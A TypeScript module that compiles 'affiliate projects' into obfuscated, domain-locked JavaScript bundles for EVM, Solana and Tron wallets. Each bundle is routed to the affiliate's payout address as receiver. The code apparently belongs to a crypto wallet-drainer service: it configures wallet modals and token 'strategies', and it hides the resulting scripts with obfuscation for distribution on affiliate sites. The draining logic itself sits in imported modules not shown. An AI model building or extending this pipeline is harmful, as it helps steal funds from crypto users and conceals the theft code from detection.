import {
  getAffiliateProject,
  getAffiliateConfig,
  getAffiliateConfigCurrentVersion,
  updateAffiliateProject,
} from "@/lib/projects";
import {
  defaultAdvancedConfig,
  defaultAppKitConfig,
  defaultContractsConfig,
  defaultGeneralConfig,
  defaultModalConfig,
  defaultStrategyConfig,
  defaultTokensConfig,
  defaultWalletConfig,
} from "@/lib/mock-data";
import { generateSDKBundle } from "@/lib/sdk-generator";
import { generateSolanaBundle, generateTronBundle } from "@/lib/runtime-bundles";
import { obfuscateScript, obfuscateWithDomainLock, type ObfuscationLevel } from "@/lib/obfuscator";
import { saveScriptBuild, type ScriptBuildRecord } from "@/lib/script-build-store";

export type AffiliateCompileResult = {
  bundle: string;
  filename: string;
  project: NonNullable<Awaited<ReturnType<typeof getAffiliateProject>>>;
  configVersion: number;
  domainLockEnabled: boolean;
  obfuscationLevel: ObfuscationLevel;
  publishedBuild: ScriptBuildRecord | null;
};

export async function compileAffiliateProject(params: {
  projectId: string;
  obfuscationLevel?: ObfuscationLevel;
  publishBuild?: boolean;
}): Promise<AffiliateCompileResult> {
  const { projectId, obfuscationLevel = "medium", publishBuild = false } = params;
  const project = await getAffiliateProject(projectId);
  if (!project) {
    throw new Error("Affiliate project not found");
  }

  const config = await getAffiliateConfig(projectId);
  const general = config?.general ?? defaultGeneralConfig;
  const wallet = config?.wallet ?? defaultWalletConfig;
  const modal = config?.modal ?? { ...defaultModalConfig, exposeExternalSDK: true };
  const tokens = config?.tokens ?? defaultTokensConfig;
  const advanced = config?.advanced ?? defaultAdvancedConfig;
  const contracts = defaultContractsConfig;
  const strategy = defaultStrategyConfig;
  const appKit = defaultAppKitConfig;

  const receiverAddress = project.payoutAddress || "0x0000000000000000000000000000000000000000";

  let bundle =
    general.ecosystem === "solana"
      ? generateSolanaBundle({
          general,
          wallet,
          modal,
          tokens,
          advanced,
          receiverAddress,
        })
      : general.ecosystem === "tron"
        ? generateTronBundle({
            general,
            wallet,
            modal,
            tokens,
            advanced,
            receiverAddress,
          })
        : generateSDKBundle({
            general,
            wallet,
            modal: { ...modal, exposeExternalSDK: true },
            tokens,
            advanced,
            contracts,
            strategy,
            appKit,
            receiverAddress,
            affiliateLabel: project.name,
          });

  const domainLockEnabled = Boolean(project.domains?.length);
  bundle = domainLockEnabled
    ? await obfuscateWithDomainLock(bundle, project.domains, obfuscationLevel)
    : await obfuscateScript(bundle, obfuscationLevel);

  await updateAffiliateProject(projectId, { lastCompiled: new Date().toISOString() });

  const publishedBuild = publishBuild
    ? await saveScriptBuild({
        bundle,
        framework: modal.modalFrameworkStyle,
        source: "compile",
      })
    : null;

  const configVersion = await getAffiliateConfigCurrentVersion(projectId);

  return {
    bundle,
    filename: `script-${projectId}.js`,
    project,
    configVersion,
    domainLockEnabled,
    obfuscationLevel,
    publishedBuild,
  };
}
